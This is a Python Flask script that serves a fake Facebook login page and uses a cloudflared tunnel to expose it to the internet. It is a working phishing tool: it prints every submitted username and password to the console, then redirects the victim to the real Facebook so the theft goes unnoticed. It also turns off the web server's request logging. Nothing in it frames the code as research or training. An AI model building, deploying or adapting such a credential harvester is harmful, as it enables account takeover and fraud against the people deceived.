import os

from flask import Flask , request , redirect
import logging
import threading
import subprocess

log = logging.getLogger("werkzeug")
log.disabled = True

app = Flask(__name__)

@app.route("/")
def home():
    name = request.args.get("name")
    password = request.args.get("password")

    print(f"name: {name}")
    print(f"password: {password}")

    if name and password:
        return redirect("https://www.facebook.com/")

    return """
        <form>
        <input type="text" name="name" id="nazwa" value="">
        <input type="password" name="password" id="haslo" value="">
        <input type="submit" value="Log in" id="przycisk" href="https://www.facebook.com/">
        </form>

        <h1 id="napis">Log into Facebook</h1>
        <a href="https://www.facebook.com/login/identify/">
        <h1 id="napis2">Forgot password?</h1>
        </a>

        <a href="https://www.facebook.com/reg/">
        <input type="button" id="przycisk2" value="Create new account"">
        </a>

        <div id="linia"></div>

        <div id="tlo"></div>

        <div id="tło2" ></div>

        <div id=napis3><b>Explore the things </b>
            <div id="napis4"><b>you love</b></div>
        </div>

        <style>

            body {
                user-select: none;
            }

            #nazwa {
                position: absolute;
                top: 27%;
                left: 69%;
                border-radius: 15px;
                border: 0.5px solid lightgray;
                height: 55px;
                width: 512px;
                font-size: 18px;
            }

            #haslo {
                position: absolute;
                top: 35%;
                left: 69%;
                border-radius: 15px;
                border: 0.5px solid lightgray;
                height: 55px;
                width: 512px;
                font-size: 18px;
            }

            #przycisk {
                position: absolute;
                top: 45%;
                left: 69%;
                border-radius: 50px;
                height: 45px;
                width: 512px;
                background-color: blue;
                color: #FFFFFF;
                font-size: 20px;
            }

            #napis {
                position: absolute;
                top: 20%;
                left: 69%;
                font-size: 18px;
                font-family: arial;
                color: black;
            }

            #napis2 {
                position: absolute;
                top: 52%;
                left: 80%;
                font-size: 15px;
                font-family: arial;
            }

            #przycisk2 {
                position: absolute;
                top: 60%;
                left: 69%;
                border-radius: 50px;
                border: 0.5px solid blue;
                height: 45px;
                width: 512px;
                background-color: #ffffff;
                color: blue;
                font-size: 18px;
            }

            #linia {
                position: absolute;
                left: 65%;
                top: -1%;
                height: 101%;
                width: 1px;
                background-color: lightgray;
            }

            #tlo {
                position: absolute;
                left: 23%;
                top: 10%;
                height: 700px;
                width: 600px;
                background-image: url("https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp");
                background-position: center;
                background-repeat: no-repeat;
                background-size: 120%;
                align-items: center;
            }

            #tło2 {
                position: absolute;
                left: -12%;
                top: -30%;
                height: 700px;
                width: 600px;
                background-image: url("https://www.saintprix.fr/wp-content/uploads/2024/08/Facebook-logo.png");
                background-position: center;
                background-repeat: no-repeat;
                background-size: 20%;
                align-items: center;
            }

            #napis3 {
                position: absolute;
                left: 3%;
                top: 70%;
                width: 200px;
                font-size: 45px;
                font-family: arial;
            }

            #napis4 {
                position: absolute;
                color: blue;
            }
        </style>
    """
def start_cloudflared():
    subprocess.Popen([
        "cloudflared",
        "tunnel",
        "--url",
        "http://localhost:5000"
    ])


threading.Thread(target=start_cloudflared).start()


app.run(host = "0.0.0.0", port = 5000)
